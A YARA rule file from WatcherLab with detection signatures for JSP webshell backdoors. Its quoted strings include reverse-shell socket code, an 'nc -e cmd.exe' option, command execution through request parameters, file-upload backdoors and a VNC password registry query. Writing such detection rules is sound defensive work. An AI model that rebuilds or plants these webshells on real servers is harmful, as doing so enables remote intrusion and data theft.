rule sig_769e3797df6ab8fffd2cc631aaa68a89e228602f
{
    meta:
        description = "jsp - file 769e3797df6ab8fffd2cc631aaa68a89e228602f.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "72b1a5c538e1eb561e17e09abcfa929b45e766fb438cb66b9049b28234437e79"
    strings:
        $s1 = "Connection conn = DriverManager.getConnection(url, username, password);  " fullword ascii
        $s2 = "/** ==== >>>>  TWEAK HERE TO DUMP HEADER  <<<< ==== **/" fullword ascii
        $s3 = "/** ==== >>>>  TWEAK HERE TO DUMP ALL TABLESPACES  <<<< ==== **/" fullword ascii
        $s4 = "out.println(\"Dumping data for table \" + table + \"..." fullword ascii
        $s5 = "ResultSet rs = ps.executeQuery();  " fullword ascii
        $s6 = "ResultSet r = p.executeQuery();  " fullword ascii
        $s7 = "<%@ page language=\"java\" contentType=\"text/html; charset=UTF-8\" pageEncoding=\"UTF-8\"%>  " fullword ascii
        $s8 = "tables.add(rs.getString(1));  " fullword ascii
        $s9 = "String sql_tables=\"select TABLE_NAME from user_tab_comments\";  " fullword ascii
        $s10 = "String password = \"motoME722remind2012\";  " fullword ascii
        $s11 = "for (int col = 1; col <= rsmeta.getColumnCount(); col++) {  " fullword ascii
        $s12 = "OutputStreamWriter osw = new OutputStreamWriter(new FileOutputStream(backupDir+table+ex), \"UTF-8\");  " fullword ascii
        $s13 = "String url = \"jdbc:oracle:thin:@127.0.0.1:1521:jcjobcn\";  " fullword ascii
        $s14 = "String table=tables.get(i);  " fullword ascii
        $s15 = "<%@ page import=\"java.sql.*\" %>  " fullword ascii
        $s16 = "ResultSetMetaData rsmeta=r.getMetaData();  " fullword ascii
        $s17 = "bw.append(\"INSERT INTO \" + table + \" VALUES(\");  " fullword ascii
        $s18 = "String ex=\".txt\";  " fullword ascii
        $s19 = "if (col == rsmeta.getColumnCount())  " fullword ascii
        $s20 = "String username = \"system\";  " fullword ascii
    condition:
        ( uint16(0) == 0x2020 and filesize < 8KB and ( 8 of them ) ) or ( all of them )
}

rule sig_4b622f46d5ed22e3b034b13b37cd1580d0c960e4
{
    meta:
        description = "jsp - file 4b622f46d5ed22e3b034b13b37cd1580d0c960e4.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "490832ed294a73dd0fd8350015eeee5b32a4c31535f822f5fe363ed10729cd7b"
    strings:
        $s1 = "if(request.getParameter(" fullword ascii
        $s2 = ")!=null)(new java.io.FileOutputStream(application.getRealPath(" fullword ascii
        $s3 = "))).write(request.getParameter(" fullword ascii
        $s4 = ")+request.getParameter(" fullword ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 1KB and ( all of them ) ) or ( all of them )
}

rule c188ac007a3ea8d4f145578598bf6693797b5f76
{
    meta:
        description = "jsp - file c188ac007a3ea8d4f145578598bf6693797b5f76.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "8f0a0afc3b62d0834ef1bc2c80bce400c9f351117f1d89d8827bb567a4362803"
    strings:
        $s1 = "out.println(\"<textarea name=content rows=10 cols=50></textarea><br>\");" fullword ascii
        $s2 = "String content=request.getParameter(\"content\");" fullword ascii
        $s3 = "if(damapath!=null &&!damapath.equals(\"\")&&content!=null&&!content.equals(\"\"))" fullword ascii
        $s4 = "out.println(\"<form action=\"+url+\" method=post>\");" fullword ascii
        $s5 = "String url1=request.getRealPath(request.getServletPath());//" fullword ascii
        $s6 = "4:</font><input type=text size=45 name=path value=\"+dir+\"/m.jsp><br>\");" fullword ascii
        $s7 = "<%@ page contentType=\"text/html;charset=UTF-8\"%>" fullword ascii
        $s8 = "String dir=new File(url1).getParent(); //" fullword ascii
        $s9 = "String damapath=request.getParameter(\"path\");" fullword ascii
        $s10 = "out.println(\"<font size=3 color=red>save bad!</font>\");" fullword ascii
        $s11 = "out.println(\"<font size=3 color=red>save ok!</font>\");" fullword ascii
        $s12 = "String url=request.getRequestURI();//" fullword ascii
        $s13 = "out.println(\"<input type=submit value=save>\");" fullword ascii
        $s14 = "out.println(\"<font size=2 color=red>" fullword ascii
        $s15 = "pw.println(content);//" fullword ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 7KB and ( 8 of them ) ) or ( all of them )
}

rule _home_chenzhongxiang_test_webshell_sample_jsp_s03
{
    meta:
        description = "jsp - file s03.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "eee89cb4f99bdf4a3cbb4a460bf36a7919f4dfc4f01a80231eb21d4255d3762c"
    strings:
        $s1 = "String EC(String s,String c)throws Exception{return new String(s.getBytes(\"ISO-8859-1\"),c);}" fullword ascii
        $s2 = "}catch(Exception e){sb.append(\"ERROR\"+\":// \"+e.toString());}sb.append(\"X@Y\");out.print(sb.toString());" fullword ascii
        $s3 = "String Pwd=\"shell007\";" fullword ascii
        $s4 = "StringBuffer sb=new StringBuffer(\"\");try{sb.append(\"X@Y\");" fullword ascii
    condition:
        ( uint16(0) == 0x3c0a and filesize < 20KB and ( all of them ) ) or ( all of them )
}

rule e52b7486b64bcc30087858e6ace4041c87dcc7f1
{
    meta:
        description = "jsp - file e52b7486b64bcc30087858e6ace4041c87dcc7f1.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "de332d848f21bb342d5ebfdb351025e8705cd972a351fd88671a021a3bc0b893"
    strings:
        $x1 = "out.print(\"<td colspan=2>filepath:<input name=execFile size=75 type=text title='example d:\\\\cmd.exe /c dir c:'></td><td><inp" fullword ascii
        $x2 = "out.print(\"<td colspan=2>filepath:<input name=execFile size=75 type=text title='example d:\\\\cmd.exe /c dir c:'></td><td><inpu" ascii
        $x3 = "out.println(\"<tr><td bgcolor=menu><a href='http://blog.csdn.net/kj021320' target=FileFrame>About nonamed(kj021320)</a></td><" fullword ascii
        $x4 = "out.print(\"<td>SqlCmd:<input type=text name=sqlcmd title='select * from admin'><input name=run type=submit value=Exec></td>\"" fullword ascii
        $x5 = "out.print(\"<td colspan=2>file:<input name=file type=file>up to file<input title='d:\\\\1.txt' name=UPaddress size=35 type=text" fullword ascii
        $x6 = "out.println(\"<tr><td bgcolor=menu><a href=?Action=T target=FileFrame>\"+ico(53)+\"SystemTools</a></td></tr>\");" fullword ascii
        $s7 = "out.print(\"<tr><td><a href='?Action=HttpProxy' target=FileFrame>OpenTheHttpProxy</a></td></tr>\");" fullword ascii
        $s8 = "out.print(\"<tr><td><a href='?Action=HttpProxy' target=FileFrame>CloseTheHttpProxy</a></td></tr>\");" fullword ascii
        $s9 = "out.println(\"<tr><td bgcolor=menu><a href=?Action=S target=FileFrame>\"+ico(53)+\"SystemInfo(System.class)</a></td></tr>\");" fullword ascii
        $s10 = "out.println(\"<tr><td bgcolor=menu><a href=?Action=L target=FileFrame>\"+ico(53)+\"ServletInfo</a></td></tr>\");" fullword ascii
        $s11 = "out.println(\"<tr><td bgcolor=menu><a href=?Action=i target=FileFrame>\"+ico(57)+\"Interfaces</a></td></tr>\");" fullword ascii
        $s12 = "out.println(\"<tr bgcolor=menu><td><a href=\\\"javascript:top.address.FolderPath.value='\"+folderReplace(f[i].getAbs" fullword ascii
        $s13 = "out.print(Runtime.getRuntime().availableProcessors()+\" <br>\");" fullword ascii
        $s14 = "out.print(\"<tr><form method=post action='?Action=IPscan'><td bordercolorlight=Black bgcolor=menu>Scan Port</td><td>IP:<input" fullword ascii
        $s15 = "out.println(\"<tr><td bgcolor=menu><a href='http://blog.csdn.net/kj021320' target=FileFrame>About nonamed(kj021320)</a></td></tr" ascii
        $s16 = "\"<form name=login method=post>username:<input name=LName type=text size=15><br>\" +" fullword ascii
        $s17 = "out.print(\"<form name=address method=post target=FileFrame onSubmit='checkUrl();'>\");" fullword ascii
        $s18 = "con=DriverManager.getConnection(url,userName,passWord);" fullword ascii
        $s19 = "\"password:<input name=LPass type=password size=15><br><input type=submit value=Login></form></center>\");" fullword ascii
        $s20 = "out.print(\"Driver:<input name=driver type=text>URL:<input name=conUrl type=text>user:<input name=user type=text size=3>passw" fullword ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 100KB and ( 1 of ($x*) and 4 of them ) ) or ( all of them )
}

rule b0bf32a5535c8815eff7429338d0111f2eef41ae
{
    meta:
        description = "jsp - file b0bf32a5535c8815eff7429338d0111f2eef41ae.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "647e68c60293582c59b2e0c6fc8ee672293c731fbbda760dc2ab8ee767019e58"
    strings:
        $x1 = "pro = Runtime.getRuntime().exec(\"cmd.exe /c net start\");  " fullword ascii
        $x2 = "pro = Runtime.getRuntime().exec(\"cmd.exe /c tasklist /svc\");  " fullword ascii
        $x3 = "pro = Runtime.getRuntime().exec(\"cmd.exe /c netstat -an\");  " fullword ascii
        $x4 = "process = Runtime.getRuntime().exec(\"ipconfig /all\");// windows" fullword ascii
        $s5 = "<!-- saved from url=(0036)http://localhost:8080/test/shell.jsp -->" fullword ascii
        $s6 = "String exec = exeCmd(out,\"taskkill /f /pid \"+Pid);" fullword ascii
        $s7 = "out.print(\"<a href='?action=Z&command=netstart' target=FileFrame>" fullword ascii
        $s8 = "out.print(\"<a href='?action=Y&command=tasklist' target=FileFrame>" fullword ascii
        $s9 = "out.print(\"<a href='?action=B&command=netstat' target=FileFrame>" fullword ascii
        $s10 = "out.print(\"<meta http-equiv=\\\"refresh\\\" content=\\\"2;url=\" + nowURI +\"\\\" />\\n\");" fullword ascii
        $s11 = "out.print(\"<form name=address method=post target=FileFrame onSubmit='checkUrl();'>\");" fullword ascii
        $s12 = "out.print(\"<TR><TD height=20><A href=\\\"?action=q\\\" target=FileFrame>" fullword ascii
        $s13 = "out.print(\"<TR><TD height=20><A href=\\\"?action=G\\\" target=FileFrame>" fullword ascii
        $s14 = "if(request.getParameter(\"pass\")!=null&&request.getParameter(\"pass\").equals(passWord)){" fullword ascii
        $s15 = "out.print(\"<TR><TD height=20><A href='?action=t' target=FileFrame>" fullword ascii
        $s16 = "out.print(\"<CENTER><A href=\\\"\\\" target=_blank><FONT color=red></FONT></CENTER></A>\");" fullword ascii
        $s17 = "</td><td>\"+System.getProperty(\"java.io.tmpdir\")+\"</td></tr>\");" fullword ascii
        $s18 = "res.setHeader(\"Content-disposition\",\"attachment;filename=\\\"\"+fName+\"\\\"\");" fullword ascii
        $s19 = "out.print(\"<A href='\"+\"javascript:JshowFolder(\\\"\"+convertPath(roots[i].getPath())+\"\\\")'>" fullword ascii
        $s20 = "public void pExeCmd(JspWriter out,HttpServletRequest request) throws Exception{" fullword ascii
    condition:
        ( uint16(0) == 0x213c and filesize < 100KB and ( 1 of ($x*) and 4 of them ) ) or ( all of them )
}

rule sig_5a9fdaa5ac254828974d0cd1e95d0a7f431e2c72
{
    meta:
        description = "jsp - file 5a9fdaa5ac254828974d0cd1e95d0a7f431e2c72.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "4c392fe2056ff0333b35b75033c79c593135b7f14f70f77a5bb9bc842f24c95e"
    strings:
        $x1 = "Process p=Runtime.getRuntime().exec(strCommand,null,new File(strDir));" fullword ascii
        $s2 = "sbSaveCopy.append(\"<p><font color=red>target file exists, copy failed.</font>\");" fullword ascii
        $s3 = "sbSaveCopy.append(\"<p><font color=red>target file error</font>\");" fullword ascii
        $s4 = "System.out.println(strCommand);" fullword ascii
        $s5 = "out.println(\"<table border='1' width='100%' bgcolor='#FBFFC6' cellspacing=0 cellpadding=5 bordercolorlight=#000000 bordercolord" ascii
        $s6 = "String[] authorInfo={\" <font color=red> mithi </font>\",\" <font color=red> Thanks for your support </font>\"};" fullword ascii
        $s7 = "sbSaveCopy.append(\"dst file:\"+strTmpFile+\"<p>\");" fullword ascii
        $s8 = "sbNewFile.append(\"<p><font color=red>create file or directory failed</font>\");" fullword ascii
        $s9 = "strCommand[1]=strShell[1];" fullword ascii
        $s10 = "strCommand[0]=strShell[0];" fullword ascii
        $s11 = "sbSaveCopy.append(\"<p><input type=button name=saveCopyBack onclick='history.back(-2);' value=return>\");" fullword ascii
        $s12 = "String[] strExecute      = {\"Execute\",\"Execute\"};" fullword ascii
        $s13 = "//Properties prop = new Properties(System.getProperties());  " fullword ascii
        $s14 = "sbSaveCopy.append(\"src file:\"+strPath+\"<p>\");" fullword ascii
        $s15 = "sb.append(\" <a href=\\\"javascript:doForm('','\"+roots[i]+strSeparator+\"','','','1','');\\\">\");" fullword ascii
        $s16 = "sbCopy.append(\"dst file: <input type=text name=file2 size=40 value='\"+strDir+\"'><p>\");" fullword ascii
        $s17 = "out.println(\"<font color=red>failed: \"+e.toString()+\"</font>\");" fullword ascii
        $s18 = "<li><a href=\"http://www.topronet.com\" class=\"current\" onClick=\"return expandcontent('menu1', this)\"> <%=strFileManage[lang" ascii
        $s19 = "<li><a href=\"http://www.topronet.com\" class=\"current\" onClick=\"return expandcontent('menu1', this)\"> <%=strFileManage[lang" ascii
        $s20 = "//out.println(path + f1.getName());" fullword ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 90KB and ( 1 of ($x*) and 4 of them ) ) or ( all of them )
}

rule sig_3b46a756478928d13a492dd85b3c30f8ed75f037
{
    meta:
        description = "jsp - file 3b46a756478928d13a492dd85b3c30f8ed75f037.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "edd2ea0252d53d4ef62d593c60e589f1710153f126cfead7523a7f99e7fa1a78"
    strings:
        $x1 = "Process proc = rt.exec(\"cmd.exe\");" fullword ascii
        $s2 = "<h1>JSP Backdoor Reverse Shell</h1>" fullword ascii
        $s3 = "String ipAddress = request.getParameter(\"ipaddress\");" fullword ascii
        $s4 = "<!--    http://michaeldaw.org   2006    -->" fullword ascii
        $s5 = "page import=\"java.lang.*, java.util.*, java.io.*, java.net.*\"" fullword ascii
        $s6 = "String ipPort = request.getParameter(\"port\");" fullword ascii
        $s7 = "Runtime rt = Runtime.getRuntime();" fullword ascii
        $s8 = "// http://www.security.org.sg/code/jspreverse.html" fullword ascii
        $s9 = "proc.getOutputStream());" fullword ascii
        $s10 = "sock.getOutputStream());" fullword ascii
        $s11 = "while( (lenRead = isr.read(buffer, 0, buffer.length)) > 0)" fullword ascii
        $s12 = "new StreamConnector(proc.getInputStream()," fullword ascii
        $s13 = "new StreamConnector(sock.getInputStream()," fullword ascii
        $s14 = "sock = new Socket(ipAddress, (new Integer(ipPort)).intValue());" fullword ascii
        $s15 = "isr = new BufferedReader(new InputStreamReader(is));" fullword ascii
        $s16 = "<input type=\"text\" name=\"ipaddress\" size=30>" fullword ascii
        $s17 = "osw.write(buffer, 0, lenRead);" fullword ascii
        $s18 = "<input type=\"text\" name=\"port\" size=10>" fullword ascii
        $s19 = "if(ipAddress != null && ipPort != null)" fullword ascii
        $s20 = "<input type=\"submit\" name=\"Connect\" value=\"Connect\">" fullword ascii
    condition:
        ( uint16(0) == 0x2f2f and filesize < 7KB and ( 1 of ($x*) and 4 of them ) ) or ( all of them )
}

rule cc1bd92ef8a894c89c35da6115c996e98dd29a6b
{
    meta:
        description = "jsp - file cc1bd92ef8a894c89c35da6115c996e98dd29a6b.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "e26e617b9e9b77f4578f8737e3463c18210855626b4aca49d465be65f59e97d1"
    strings:
        $x1 = "program = \"cmd.exe /c net start > \" + SHELL_DIR" fullword ascii
        $x2 = "<option value=\\\"nc -e cmd.exe 192.168.230.1 4444\\\">nc</option>\"" fullword ascii
        $x3 = ": \"c:\\\\windows\\\\system32\\\\cmd.exe\")" fullword ascii
        $x4 = "+ \"\\\" method=\\\"post\\\" onsubmit=\\\"this.submit();$('cmd').value='';return false;\\\" target=\\\"asyn\\\">\"" fullword ascii
        $x5 = "<a href=\\\"javascript:doPost({o:'vs'});\\\">Execute Command</a> | \"" fullword ascii
        $s6 = "((Invoker) ins.get(\"vLogin\")).invoke(request, response," fullword ascii
        $s7 = "ins.put(\"executesql\", new ExecuteSQLInvoker());" fullword ascii
        $s8 = "((Invoker) ins.get(\"login\")).invoke(request, response," fullword ascii
        $s9 = "+ (JSession.getAttribute(CURRENT_DIR).toString() + \"/exportdata.txt\")" fullword ascii
        $s10 = "+ \"')\\\">View</a> | <a href=\\\"javascript:doPost({o:'executesql',type:'struct',table:'\"" fullword ascii
        $s11 = "<option value='reg query \\\"HKEY_LOCAL_MACHINE\\\\SOFTWARE\\\\RealVNC\\\\WinVNC4\\\" /v \\\"password\\\"'>vnc hash</option>\"" fullword ascii
        $s12 = "+ \"\\\" method=\\\"post\\\" target=\\\"echo\\\" onsubmit=\\\"$('cmd').focus()\\\">\"" fullword ascii
        $s13 = "Object obj = ((DBOperator) dbo).execute(sql);" fullword ascii
        $s14 = "ins.put(\"vLogin\", new VLoginInvoker());" fullword ascii
        $s15 = "<a href=\\\"javascript:doPost({o:'vd'});\\\">Download Remote File</a> | \"" fullword ascii
        $s16 = "var savefilename = prompt('Input Target File Name(Only Support ZIP)','pack.zip');\"" fullword ascii
        $s17 = "+ \" <option value='oracle.jdbc.driver.OracleDriver`jdbc:oracle:thin:@dbhost:1521:ORA1'>Oracle</option>\"" fullword ascii
        $s18 = "+ \"<h2>Execute Shell &raquo;</h2>\"" fullword ascii
        $s19 = "ins.put(\"login\", new LoginInvoker());" fullword ascii
        $s20 = "(new StreamConnector(process.getErrorStream(), socket" fullword ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 400KB and ( 1 of ($x*) and 4 of them ) ) or ( all of them )
}

rule ee1d81cba39fb4877c803d32f17348d7cd36348f
{
    meta:
        description = "jsp - file ee1d81cba39fb4877c803d32f17348d7cd36348f.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "8047492f47b2ad546190ad1dd18984916da0ac0b046dca46e1f5af315781d182"
    strings:
        $s1 = "private static final String PW = \"ninty\"; //password" fullword ascii
    condition:
        ( uint16(0) == 0xbbef and filesize < 200KB and ( all of them ) ) or ( all of them )
}

rule sig_7fe11e5f98e9945d0b0790d511b24e740ce5d596
{
    meta:
        description = "jsp - file 7fe11e5f98e9945d0b0790d511b24e740ce5d596.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "7439d1c0b9994b74db771d9568e3b845630e3497aab71f12cc3af954e7522e45"
    strings:
        $s1 = "public String getBoundary(HttpServletRequest request,Properties prop) throws ServletException,IOException{" fullword ascii
        $s2 = "Long contentsize = new Long(prop.getProperty(\"content-length\",\"0\"));" fullword ascii
        $s3 = "out.println(\"FileName: \" + newfile.getName());" fullword ascii
        $s4 = "long l = contentsize.longValue() - ROUGHSIZE; " fullword ascii
        $s5 = "<form name=\"test\" method=\"post\" action=\"\" enctype=\"multipart/form-data\">" fullword ascii
        $s6 = "// up.jsp = File Upload (unix)" fullword ascii
        $s7 = "out.println(\"FileSize: \" + newfile.length());" fullword ascii
        $s8 = "ServletInputStream fin =  request.getInputStream();" fullword ascii
        $s9 = "if(\"content-type\".equalsIgnoreCase(header) ){" fullword ascii
        $s10 = "boundary = prop.getProperty(\"boundary\"); " fullword ascii
        $s11 = "public String getFileName(String secondline){" fullword ascii
        $s12 = "String tboundary = st.getBuffer().toString();" fullword ascii
        $s13 = "String hvalue = request.getHeader(header);" fullword ascii
        $s14 = "String boundary = getBoundary(request,prop);" fullword ascii
        $s15 = "String header = (String)enum.nextElement();" fullword ascii
        $s16 = "String secondline = st.getBuffer().toString();" fullword ascii
        $s17 = "while((c = fin.read()) != -1){" fullword ascii
        $s18 = "Enumeration enum = request.getHeaderNames();" fullword ascii
        $s19 = "<%@ page import=\"java.io.*,java.util.*,javax.servlet.*\" %>" fullword ascii
        $s20 = "while((c=fin.read()) != -1 ){" fullword ascii
    condition:
        ( uint16(0) == 0x6a3c and filesize < 10KB and ( 8 of them ) ) or ( all of them )
}

rule sig_275da720a99ed21fd98953f9ddda7460e5b96e5f
{
    meta:
        description = "jsp - file 275da720a99ed21fd98953f9ddda7460e5b96e5f.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "dc34856d6d9427af27e8e4369a3a3a333b90adc51482f8c497a1df8aa1e26e09"
    strings:
        $s1 = "sRet += \"  <td><a title=\\\"\" + files[n].getName() + \"\\\">\" + strCut(files[n].getName(), 50) + \"</a></td>\\n\";" fullword ascii
        $s2 = "sRet += \"  <td>[<a href=\\\"\" + curUri + \"&curPath=\" + pathConvert(curFile.getParent()) + \"\\\">" fullword ascii
        $s3 = "\"\\\">&lt;\" + strCut(files[n].getName(), 50) + \"&gt;</a></td>\\n\";" fullword ascii
        $s4 = "result += \"<meta http-equiv=\\\"refresh\\\" content=\\\"2;url=\" + request.getRequestURI() + \"?action=\" + request.getParamete" ascii
        $s5 = "\"\\\">\" + pathConvert(files[n].getPath()) + \"</a></td>\\n\";" fullword ascii
        $s6 = "private String _password = \"s3ctesting\";" fullword ascii
        $s7 = "<form name=\"config\" method=\"post\" action=\"<%=request.getRequestURI() + \"?action=config&cfAction=save\"%>\" onSubmit=\"java" ascii
        $s8 = "sRet += \"  <td width=\\\"15%\\\" align=\\\"center\\\">\" + files[n].length() + \"</td>\\n\";" fullword ascii
        $s9 = "<input type=\"hidden\" name=\"__VIEWSTATE\" value=\"dDwtMTQyNDQzOTM1NDt0PDtsPGk8OT47PjtsPHQ8cDxsPGVuY3R5cGU7PjtsPG11bHRpc" fullword ascii
        $s10 = "_url = \"jdbc:mysql://\" + dbServer + \":\" + dbPort + \";User=\" + dbUsername + \";Password=\" + dbPassword + \";DatabaseName=" ascii
        $s11 = "_url = \"jdbc:microsoft:sqlserver://\" + dbServer + \":\" + dbPort + \";User=\" + dbUsername + \";Password=\" + dbPassword + \";" ascii
        $s12 = "if (request.getParameter(\"command\") != null) {  " fullword ascii
        $s13 = ".getPath()) + \"\\\" /></td>\\n\";" fullword ascii
        $s14 = "3J5O0RCX3JCX01TU1FMO0RCX3JCX01TU1FMO0RCX3JCX0FjY2VzcztEQl9yQl9BY2Nlc3M7Pj7Z5iNIVOaWZWuK0pv8lCMSbhytgQ==\" />" fullword ascii
        $s15 = "sRet += \"<meta http-equiv=\\\"refresh\\\" content=\\\"2;url=\" + curUri + \"&curPath=\" + path + \"&fsAction=open\" + \"\\\" />" ascii
        $s16 = "sRet += \" if (folderName != null && folderName != false && ltrim(folderName) != \\\"\\\") {\\n\";" fullword ascii
        $s17 = "=\\\" + document.fileList.filesDelete[selected].value;\";" fullword ascii
        $s18 = "<TD align=\"left\"><FONT face=\"webdings\" color=\"#ffffff\"> 8</FONT><FONT face=\"Verdana, Arial, Helvetica, sans-serif\" c" fullword ascii
        $s19 = "Action=open\" + \"\\\">edit</a>>\" : \"\") + \"</td>\\n\";" fullword ascii
        $s20 = "<td align=\"center\" class=\"datarows\"><%=System.getProperty(\"java.compiler\") == null ? \"\" : System.getProperty(\"java.comp" ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 200KB and ( 8 of them ) ) or ( all of them )
}

rule sig_5fd522e996b9858d2913c55ad4e7c374824d4e82
{
    meta:
        description = "jsp - file 5fd522e996b9858d2913c55ad4e7c374824d4e82.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "7d3cb8a8ff28f82b07f382789247329ad2d7782a72dde9867941f13266310c80"
    strings:
        $s1 = "l; try { Process p = Runtime.getRuntime().exec(cmd); BufferedReader sI = new BufferedReader(new InputStreamReader(p.getInputStre" ascii
        $s2 = "<%@ page import=\"java.io.*\" %> <% String cmd = request.getParameter(\"cmd\"); String output = \"\"; if(cmd != null) { String s" ascii
        $s3 = "am())); while((s = sI.readLine()) != null) { output += s +\"\\r\\n\"; } } catch(IOException e) { e.printStackTrace(); } } " fullword ascii
        $s4 = "<%@ page import=\"java.io.*\" %> <% String cmd = request.getParameter(\"cmd\"); String output = \"\"; if(cmd != null) { String s" ascii
        $s5 = "1234<%@ page contentType=\"text/html; charset=GBK\" %>" fullword ascii
    condition:
        ( uint16(0) == 0x3231 and filesize < 1KB and ( all of them ) ) or ( all of them )
}

rule ccb11b02170a505b496d26868fb98a785c3aac51
{
    meta:
        description = "jsp - file ccb11b02170a505b496d26868fb98a785c3aac51.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "57764b5504b584b7cd7969b17d2401a6fe85f1f3a03d02943bc0bdc74514a7c3"
    strings:
        $s1 = "System.setProperty(\"sun.net.client.defaultConnectTimeout\", String" fullword ascii
        $s2 = "System.setProperty(\"sun.net.client.defaultReadTimeout\", String" fullword ascii
        $s3 = "private static final String PW = \"xfg\"; //password" fullword ascii
        $s4 = "responseContent = tempStr.toString();" fullword ascii
        $s5 = "FileLocalUpload(uc(dx())+sxm,request.getRequestURL().toString(),  \"GBK\");" fullword ascii
        $s6 = "\" /> <input type=\\\"submit\\\" name=\\\"submit\\\" value=\\\"Scan\\\" id=\\\"submit\\\" class=\\\"bt\\\" />\"+" fullword ascii
        $s7 = "String tempLine = rd.readLine();" fullword ascii
        $s8 = "for (int i = SysInfo.length() - 1; i >= 0; i--) {" fullword ascii
        $s9 = "tempLine = rd.readLine();" fullword ascii
        $s10 = "tempStr.append(tempLine);" fullword ascii
        $s11 = "StringBuffer tempStr = new StringBuffer();" fullword ascii
        $s12 = "url_con = (HttpURLConnection) url.openConnection();" fullword ascii
        $s13 = "String c=\"\\n\\r\"; long d=127,  f=11, j=12, h=14,  m=31, r=83, k=1, n=8,  s=114, u=-5, v=5,a=0;" fullword ascii
        $s14 = "BufferedReader rd = new BufferedReader(new InputStreamReader(in," fullword ascii
        $s15 = "InputStream in = url_con.getInputStream();" fullword ascii
        $s16 = "String crlf=System.getProperty(\"line.separator\");" fullword ascii
        $s17 = "while (tempLine != null)" fullword ascii
        $s18 = "HttpURLConnection url_con = null;" fullword ascii
        $s19 = "private static int readTimeOut = 10000;" fullword ascii
        $s20 = "url_con.getOutputStream().close();" fullword ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 300KB and ( 8 of them ) ) or ( all of them )
}

rule sig_4efa90145d62e21bfc37023580d455489ff1de37
{
    meta:
        description = "jsp - file 4efa90145d62e21bfc37023580d455489ff1de37.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "410bf542ec9d693517486e33e7f45955d2a06f77f195e847c74ac3dcacf6a677"
    strings:
        $x1 = "<td><span style=\\\"float:right;\\\"><a href=\\\"http://www.forjj.com\\\" target=\\\"_blank\\\">JspSpy Ver: 2010 </a></span>\"+r" ascii
        $s2 = "<td><span style=\\\"float:right;\\\"><a href=\\\"http://www.forjj.com\\\" target=\\\"_blank\\\">JspSpy Ver: 2010 </a></span>\"+r" ascii
        $s3 = "response.getWriter().println(\"<div style=\\\"padding:10px;border-bottom:1px solid #fff;border-top:1px solid #ddd;background:#ee" ascii
        $s4 = "\">Copyright (C) 2010 <a href=\\\"http://www.forjj.com\\\" target=\\\"_blank\\\">http://www.Forjj.com/</a>&nbsp;&nbsp;<a target=" ascii
        $s5 = "\"<!--<span style=\\\"font:11px Verdana;\\\">Copyright &copy; 2010 NinTy </span><a href=\\\"http://www.forjj.com\\\" target=\\\"" ascii
        $s6 = "\"<!--<span style=\\\"font:11px Verdana;\\\">Copyright &copy; 2010 NinTy </span><a href=\\\"http://www.forjj.com\\\" target=\\\"" ascii
        $s7 = "JSession.setAttribute(\"MSG\",\"<span style='color:red'>Upload File Failed!</span>\");" fullword ascii
        $s8 = "JSession.setAttribute(MSG,\"<span style='color:green'>Upload File Success!</span>\");" fullword ascii
        $s9 = "File f = new File(JSession.getAttribute(CURRENT_DIR)+\"/\"+fileBean.getFileName());" fullword ascii
        $s10 = "private static final String PW = \"sysy\"; //password" fullword ascii
        $s11 = "oString()+\"/exportdata.txt\")+\"\\\" size=\\\"100\\\" class=\\\"input\\\"/>\"+" fullword ascii
        $s12 = "der(\"host\")+\" (<span id='ip'>\"+InetAddress.getLocalHost().getHostAddress()+\"</span>) | <a href=\\\"javascript:if (!window.c" ascii
        $s13 = "\" <input type=\\\"submit\\\" class=\\\"bt\\\" value=\\\"Export\\\"/><br/><br/>\"+BACK_HREF+\"</td>\"+" fullword ascii
        $s14 = "\"    <hr/>Export \\\"<span style='color:red;font-weight:bold'>\"+(Util.isEmpty(sql) ? table : sql.replaceAll(\"\\\"\",\"&quot;" ascii
        $s15 = "dData){alert('only support IE!');}else{void(window.clipboardData.setData('Text', document.getElementById('ip').innerText));alert" ascii
        $s16 = "/option><option value='ISO-8859-1'>ISO-8859-1</option></select>\"+" fullword ascii
    condition:
        ( uint16(0) == 0xbbef and filesize < 400KB and ( 1 of ($x*) and 4 of them ) ) or ( all of them )
}

rule sig_61ce175758d665502a2f8f24d85537bf415eba84
{
    meta:
        description = "jsp - file 61ce175758d665502a2f8f24d85537bf415eba84.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "08c0fe8f87cfc6487b2261cafa2cb23835114bf0af5c10c044bec3ffc10de7ee"
    strings:
        $s1 = "<form method=post action=\"?\" onkeydown=\"if(event.ctrlKey&&event.keyCode==13)this.submit()\">" fullword ascii
        $s2 = "<meta http-equiv=\"Content-Type\" content=\"text/html; charset=gb2312\" />" fullword ascii
